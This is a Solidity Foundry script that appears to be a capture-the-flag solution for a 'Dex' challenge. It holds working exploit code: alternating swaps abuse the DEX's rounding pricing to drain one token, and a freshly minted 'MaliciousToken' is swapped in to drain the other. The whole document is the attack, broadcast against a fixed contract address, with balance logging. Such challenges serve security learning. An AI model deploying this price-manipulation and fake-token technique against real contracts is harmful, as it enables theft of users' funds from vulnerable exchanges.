// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Dex.sol";

contract Solve is Script {
    Dex victim;

    address token1;
    address token2;

    function setUp() external {
        victim = Dex(0x97B7A042c3201f88aEb849498C6a62da9a8CBEbB);
        token1 = victim.token1();
        token2 = victim.token2();
    }

    function run() external { 
        vm.startBroadcast();

        victim.approve(address(victim), type(uint256).max); _print();
        victim.swap(token1, token2, 10); _print();
        victim.swap(token2, token1, 20); _print();
        victim.swap(token1, token2, 24); _print();
        victim.swap(token2, token1, 30); _print();
        victim.swap(token1, token2, 41); _print();
        victim.swap(token2, token1, 45); _print();

        MaliciousToken token3 = new MaliciousToken("upside", "ethan");
        token3.transfer(address(victim), 1);

        token3.approve(address(victim), 1);
        victim.swap(address(token3), token2, 1); _print();

        console.log("player token3:", token3.balanceOf(tx.origin));
        console.log("victim token3:", token3.balanceOf(address(victim)));

        vm.stopBroadcast();
    }

    function _print() private view {
        console.log("player token1:", victim.balanceOf(token1, tx.origin));
        console.log("player token2:", victim.balanceOf(token2, tx.origin));
        console.log("victim token1:", victim.balanceOf(token1, address(victim)));
        console.log("victim token2:", victim.balanceOf(token2, address(victim)));
        console.log("=============");
    }
}

contract MaliciousToken is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 2);
    }
}